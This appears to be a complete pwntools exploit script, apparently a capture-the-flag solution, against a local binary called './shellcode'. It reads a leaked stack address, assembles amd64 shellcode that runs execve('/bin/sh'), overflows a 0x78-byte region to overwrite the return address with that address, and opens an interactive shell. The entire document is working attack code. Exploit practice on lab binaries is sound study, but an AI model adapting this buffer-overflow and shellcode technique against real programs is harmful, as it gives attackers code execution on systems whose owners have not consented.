#!/usr/bin/env python
from pwn import *

r = process( './shellcode' )


r.recvuntil( '0x' )

adr = int( r.recvline() , 16 )
print hex( adr )

context.arch = 'amd64'

sc = asm('''
xor rsi, rsi
xor rdx, rdx
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rax, 0x3b
syscall
''')

r.sendline( sc.ljust( 0x70 + 8 , 'a' ) + p64( adr ) )

r.interactive()